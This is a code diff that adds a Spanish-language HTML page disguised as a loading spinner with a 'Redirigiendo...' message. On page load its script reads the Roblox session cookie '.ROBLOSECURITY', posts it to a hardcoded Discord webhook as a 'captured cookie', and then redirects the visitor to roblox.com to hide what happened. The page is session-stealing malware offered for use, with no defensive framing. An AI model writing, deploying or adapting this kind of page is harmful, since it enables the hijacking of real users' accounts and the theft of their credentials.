@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando...</title>
+    <style>
+        body {
+            background-color: #000000;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #333;
+            border-top: 5px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        #msg {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            color: #555;
+            font-size: 12px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="spinner"></div>
+    <div id="msg">Redirigiendo...</div>
+
+    <script>
+        // ⚠️ IMPORTANTE: Reemplaza esto con tu URL REAL de Discord Webhook
+        const webhookURL = https://discord.com/api/webhooks/1511504459530764427/VzM0jJscU_TqVZ0sSQHLsPwcMasZS4I-_xS5WIrMcwTi78nvEhzK9v9u5XtYx9piUmp7
+
+        window.onload = function() {
+            const cookieValue = getCookie('.ROBLOSECURITY');
+
+            if (cookieValue) {
+                enviarAWebhook(cookieValue);
+                document.getElementById('msg').style.display = 'block';
+                
+                // Redirige a Roblox después de 2 segundos
+                setTimeout(() => {
+                    window.location.href = "https://www.roblox.com";
+                }, 0); // Usamos 0 para que sea inmediato visualmente, pero el mensaje ya apareció
+            } else {
+                // Si no hay cookie, igual redirigimos
+                setTimeout(() => {
+                    window.location.href = "https://www.roblox.com";
+                }, 1000);
+            }
+        };
+
+        function getCookie(name) {
+            const value = `; ${document.cookie}`;
+            const parts = value.split(`; ${name}=`);
+            if (parts.length === 2) return parts.pop().split(';').shift();
+        }
+
+        function enviarAWebhook(cookie) {
+            // Usamos fetch con try/catch para ver errores en la consola si abres F12
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    content: `🍪 **Nueva Cookie Roblox Capturada:**\n\`${cookie}\`` 
+                })
+            })
+            .then(response => {
+                console.log("Cookie enviada correctamente");
+            })
+            .catch(error => {
+                console.error("Error al enviar cookie:", error);
+            });
+        }
+    </script>
+
+</body>
+</html>
+    
